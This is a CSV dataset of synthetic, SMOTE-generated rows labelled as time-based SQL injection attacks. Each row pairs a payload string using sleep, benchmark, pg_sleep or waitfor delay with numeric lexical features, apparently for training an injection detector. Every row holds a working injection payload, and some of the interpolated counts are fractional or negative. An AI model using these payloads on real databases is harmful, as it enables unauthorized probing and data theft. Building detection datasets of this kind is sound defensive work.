id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000985,attack,time,"select sleep  (  5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000152,1.0010465009662344,52.419799686053906,16.79010015697305,2.854357853891471,15.382675274702834,1.1975250392432626,26.432174489837593,9.407424882270213,0.2982235383370364,0.02344869260591073,0.49966313669712836,0.17866463235992452,0.0,3.1975250392432626,0.0,0.0,0.0,1.0,0.0,4.407424882270213,0.8024749607567379,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.8024749607567379,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.802474960756738
SMOTE_000986,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,0.9991096242405927,82.83016114826425,20.83016114826425,3.013743779383566,29.106881531019,2.0,41.4465592344905,10.27672038275475,0.35115061311221796,0.024152034103797917,0.5006816483502328,0.12401570443375136,0.0,0.0,0.5534407655094994,0.0,1.0,0.0,0.0,8.72327961724525,0.0,0.0,0.0,1.5534407655094995,0.0,0.0,0.2767203827547497,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000987,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000045,0.6732511862675721,87.69983280125486,27.0,3.781472703993577,20.24958200313715,27.79933120501944,31.20066879498056,8.45025079811771,0.2307434893564637,0.316734407347426,0.3560602365117129,0.09646186678439742,0.15008359937257,0.0,0.0,0.0,0.0,1.84991640062743,0.0,4.45025079811771,0.0,0.0,1.0,1.84991640062743,0.15008359937257,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.84991640062743,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8499164006274302
SMOTE_000988,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000100,1.448079272521298,78.357850890484,17.905233926989336,2.627709127342425,18.26308481747334,4.189532146021328,44.0,11.905233926989336,0.23133985079353095,0.055143052348097674,0.5622051623004567,0.15131193455791467,0.0,2.905233926989337,0.0,0.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,1.0,0.0,0.7263084817473342,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.2736915182526658,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.273691518252666
SMOTE_000989,attack,time,""" or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000040,0.331294483826869,33.813599915634875,16.0,3.168409812043059,10.999999999999998,0.0,13.906799957817439,8.906799957817437,0.32541397144119155,-1.3877787807814457e-17,0.41125073506149323,0.26333529349731527,0.09320004218256206,1.8135999156348759,0.0,0.0,0.0,1.0,0.0,1.9999999999999996,0.0,4.0,0.0,1.0,0.093200042182562,0.9067999578174378,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000990,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000134,1.7622651207069198,65.36479227356186,23.909256039080265,3.587712772000001,18.72685990229934,13.637024156321061,25.63702415632106,7.363884058620398,0.2937599481056099,0.20453598850413837,0.3901924762490322,0.11151158714121948,1.0,0.0,0.0,0.0,0.0,1.4546280195401327,0.0,3.4546280195401327,0.0,0.0,0.45462801954013254,1.4546280195401327,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.45462801954013254,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4546280195401327
SMOTE_000991,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",nearest_attack_euclidean,R000119,1.525538772392437,93.77144433730548,26.352379638557878,3.556480789137845,22.476203614421237,21.0,38.0,12.295240722884248,0.2373766494356121,0.22482198254824215,0.40682073032539057,0.13098063769075521,2.942861084326371,0.0,0.0,0.0,0.0,1.6476203614421236,0.0,6.352379638557876,0.0,0.0,1.0,1.6476203614421236,1.0,0.0,0.0,0.35237963855787635,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.0,0.6476203614421236,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6476203614421236
SMOTE_000992,attack,time,1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'prjf'  =  'prjf,nearest_attack_euclidean,R000133,0.05376775802637349,109.16571865796183,24.988952089469212,3.250686072806934,31.088383284246312,9.911616715753684,53.13257492636947,15.033143731592368,0.2847363494810618,0.09090774159792346,0.4866578557341148,0.1376980531869,4.0,0.0,0.0,0.0,0.01104791053078924,1.9889520894692108,0.0,8.044191642123156,0.0,0.9889520894692108,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0110479105307892,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.01104791053078924,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.022095821061578
SMOTE_000993,attack,time,"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,1.9413355648980615,86.23332851429738,27.61666425714869,3.5186940655224994,18.68335019995916,18.699985542892147,36.849992771446075,12.0,0.21713566073937646,0.21649747713744044,0.42719173598005517,0.13917512614312796,0.6166642571486913,1.150007228553926,0.0,0.0,0.0,1.0,0.0,6.616664257148692,0.9999999999999999,0.0,1.0,1.0,0.6166642571486912,0.38333574285130856,0.0,0.6166642571486913,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.3833357428513088,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3833357428513087
SMOTE_000994,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",nearest_attack_euclidean,R000119,0.23287083137065973,96.90445567881517,26.054777216059243,3.6297736026026057,25.835668351822275,20.67133670364455,37.50700505546682,12.890445567881516,0.2669256476752209,0.2130818194272694,0.386880845060279,0.1331116878372307,3.9452227839407583,0.0,0.0,0.0,0.0,1.945222783940758,0.0,5.945222783940758,0.05477721605924196,0.0,1.0,1.945222783940758,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.05477721605924202,0.0,0.0,0.0,1.0,0.9452227839407581,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000995,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,1.6447779888409173,58.617932813566924,26.146059430994093,4.149983359046988,27.955025837777555,2.629211886198818,14.404483203391731,13.629211886198819,0.46386325002891804,0.04544426359385567,0.2454593436562007,0.24523314272102564,3.258423772397637,0.0,2.0,0.0,0.0,0.0,0.0,1.9999999999999996,0.0,2.112364341403544,1.0,3.258423772397637,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.6292118861988186,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6292118861988185
SMOTE_000996,attack,time,1  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000088,0.07188926675652844,30.03246315816463,13.032463158164632,2.84199730492662,10.000000000000002,2.0,14.000000000000002,4.032463158164631,0.33298426711650936,0.06659685342330188,0.4661779739631131,0.13424090549707568,0.032463158164630634,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.03246315816463058,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000997,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000110,1.1026517843465788,81.40411643678044,24.958902283525216,3.4356866625784486,16.760274429118695,19.479451141762606,34.64384200766175,10.520548858237392,0.20684930202518012,0.24186136718504087,0.42207901614346083,0.12921031464631824,0.0,1.0,0.0,0.0,0.0,1.0,0.0,6.280823287356089,0.2397255708813036,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.23972557088130364,0.7602744291186962,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000998,attack,time,1  )   as cwsi where 7360  =  7360 or sleep  (  5  )  #,nearest_attack_euclidean,R000124,0.34672331875203455,54.56719183064915,21.855730610216384,3.5032389477745447,17.567191830649147,10.0,21.85573061021638,5.144269389783618,0.3213306485098399,0.18342414905139465,0.40058885465217803,0.09465634778658748,0.0721346948918089,0.0,0.14426938978361803,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,1.144269389783618,0.07213469489180901,0.0,0.07213469489180901,0.9278653051081911,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000999,attack,time,"1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000126,1.6643122389559033,87.54087824331523,27.0,3.450561691137574,18.696536925801663,18.688682635027146,38.38521956082881,11.770439121657619,0.2128227550033462,0.21432406505203028,0.43857564715572334,0.1342775327889002,1.7704391216576183,0.0,0.0,0.0,0.0,1.0,0.0,7.0,0.3852195608288091,0.0,1.0,1.0,1.0,0.0,0.0,0.6147804391711909,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.38521956082880926,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3852195608288094
SMOTE_001000,attack,time,1  )   as cwsi where 7360  =  7360 or sleep  (  5  )  #,nearest_attack_euclidean,R000124,0.683420120871329,56.42010857401867,23.065081430514,3.580793482961991,19.242595002266334,10.0,21.822486428247664,5.355027143504667,0.3396192700699314,0.1777197443751265,0.3881657618831778,0.09449522367176431,0.1775135717523334,0.0,0.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,1.1775135717523333,0.17751357175233323,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.1775135717523333,0.0,1.0,0.0,0.0,0.8224864282476667,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001001,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,1.026847844433931,113.91475366886675,28.27131158278331,3.3354930401908622,36.72868841721669,10.0,53.609835779244506,13.576229472405563,0.3226225777296669,0.08802736694505084,0.4700722138227198,0.11927784150256243,1.0,0.0,0.0,0.0,1.0,1.0,0.0,9.576229472405563,0.0,0.0,0.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,1.0,1.0,0.0,0.5762294724055635,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.576229472405563
SMOTE_001002,attack,time,"1""   )    )    as klie where 2840  =  2840 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000052,0.46238540056315264,105.02357857088768,28.384188669838828,3.6590802853694493,26.871012561371185,26.17891822645177,41.17891822645177,10.794729556612943,0.2547361880735154,0.2490256149839222,0.39314731229248817,0.10309088465007424,0.0,0.8973647783064713,0.0,0.0,0.0,1.8973647783064713,0.0,6.0,0.0,0.0,1.0,1.8973647783064713,0.0,0.8973647783064713,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.8973647783064714,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8973647783064713
SMOTE_001003,attack,time,"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",nearest_attack_euclidean,R000154,2.6753740664394035,44.01098760353709,20.005493801768544,4.00351187348822,25.01098760353709,3.502746900884272,7.497253099115728,8.0,0.5673958408215346,0.07923520032428993,0.1712198392000848,0.18214911965409072,3.491759297347183,2.0109876035370897,0.0,0.0,0.0,0.4972530991157275,0.0,0.0,0.0,0.0,0.0,0.49725309911572757,1.0,0.5027469008842724,0.0,0.0,0.0,0.4972530991157277,1.1102230246251565e-16,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001004,attack,time,1%' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000125,1.4036908023500545,80.56927358741613,20.0,3.0031965550235644,27.284636793708067,2.0,39.8539103811242,11.430726412583867,0.33862813363359906,0.024826440979446293,0.4945291403324248,0.14201628505452984,0.7153632062919333,0.0,0.0,0.0,1.0,0.0,0.0,8.284636793708067,0.7153632062919333,0.0,0.0,1.0,0.7153632062919333,0.0,0.0,0.7153632062919332,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,0.2846367937080667,0.7153632062919333,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001005,attack,time,"1""  )   as gdcx where 2335  =  2335 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000142,1.9214674295366851,98.53859289895706,30.922814202085885,3.8051933310449284,30.538592898957056,18.0,39.0,11.0,0.3098973734414636,0.18267422467725963,0.3957941534673959,0.1116342484138809,0.4614071010429419,0.5385928989570579,2.0,0.0,0.0,2.0,0.0,5.0,0.0,1.0,0.0,4.0,0.4614071010429421,0.538592898957058,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,1.0,1.0,0.538592898957058,0.461407101042942,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001006,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.0562560690993122,33.15852715011027,16.94715761662991,3.492753101301843,13.0,0.9471576166299105,10.158527150110267,9.05284238337009,0.39220466923280006,0.02870174595848214,0.3060994313573537,0.2729941534513641,0.0,0.0,2.0,0.0,0.0,0.0,0.0,2.052842383370089,0.0,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001007,attack,time,waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf,nearest_attack_euclidean,R000137,2.397081254938161,54.87735996672055,22.31603995008082,3.8197433853556726,24.754719933441095,3.4386799833602737,16.68396004991918,10.0,0.45058716837673496,0.06251872989460751,0.304610239184744,0.18228386254391354,3.6839600499191802,1.7547199334410932,0.0,0.0,0.0,0.5613200166397267,0.0,1.9999999999999996,0.0,0.0,0.0,0.5613200166397267,1.0,0.4386799833602733,0.0,0.0,0.0,0.5613200166397267,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001008,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.09929463305123386,38.389918324564796,17.0,3.3109324282958577,13.0,0.0,14.491598603803995,10.8983197207608,0.3467549237580186,-1.3877787807814457e-17,0.3665478590436929,0.2866972171982885,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.8983197207607994,0.0,5.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001009,attack,time,"1""  )   where 7165  =  7165 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000118,0.8113698486653237,96.65334198128843,28.189524427234886,3.7743068272223557,21.516195417879104,28.620951145530224,35.5161954178791,11.0,0.221577573843072,0.2974214430873204,0.36685468300993196,0.11414630005967566,0.0,1.0,1.6209511455302241,0.0,0.0,2.0,0.0,5.189524427234888,0.0,0.0,1.0,3.620951145530224,0.0,1.0,0.8104755727651121,0.18952442723488783,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001010,attack,time,1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000136,1.1144821492708035,100.10542552212942,31.736821809733822,3.7859259415423123,30.263178190266178,18.0,40.57906914159706,11.263178190266178,0.30252490344457095,0.18002525419731136,0.4049515961218199,0.11249824623629782,0.7368218097338225,0.26317819026617745,2.0,0.0,0.0,2.0,0.0,5.263178190266178,0.0,1.0,0.0,4.0,0.7368218097338224,0.2631781902661774,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,1.0,1.0,0.2631781902661775,0.7368218097338225,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001011,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'nbzf' like 'nbzf,nearest_attack_euclidean,R000097,0.32736498635303796,104.56628827013586,24.0,3.2171662002888386,40.0,1.0,49.63857355844655,13.92771471168931,0.38262130535782257,0.00956553263394555,0.4746258595603746,0.1331873024478572,2.7831441350679293,0.21685586493207043,0.0,0.0,1.0,0.0,0.0,9.927714711689308,0.0,0.0,0.0,1.0,0.9277147116893099,0.07228528831069014,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001012,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,1.2320258757698503,54.77477549374059,18.023166177230127,3.33047517844908,25.317889215179918,1.0,21.09266470892051,7.3642215696401685,0.47054696810054386,0.018507882658206076,0.37858189126638603,0.13236325797486403,3.0,0.0,0.0,0.0,0.0,0.34105539241004224,0.0,3.6821107848200842,0.0,0.34105539241004224,0.0,0.34105539241004235,1.0,0.0,0.0,0.0,0.0,0.3410553924100423,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6589446075899578,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.658944607589958
SMOTE_001013,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'nbzf' like 'nbzf,nearest_attack_euclidean,R000097,0.38380685461185304,107.30102613638738,24.08217950487098,3.1876752985848866,39.83564099025804,1.0821795048709788,51.89012861203249,14.493077029225867,0.37312576144085924,0.009976929600792342,0.4821634226597954,0.134733886298553,3.082179504870978,0.0,0.0,0.0,1.0,0.0821795048709778,0.0,10.328718019483912,0.0,0.0,0.0,1.082179504870978,1.0,0.0,0.0,0.0,0.0,0.08217950487097792,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,1.0,0.08217950487097792,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.082179504870978
SMOTE_001014,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.09365150143691085,100.0,33.4833391443441,4.080529541622695,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,0.0,2.0,0.0,0.0,0.0,1.0000000000000002,6.0,0.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0000000000000002,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
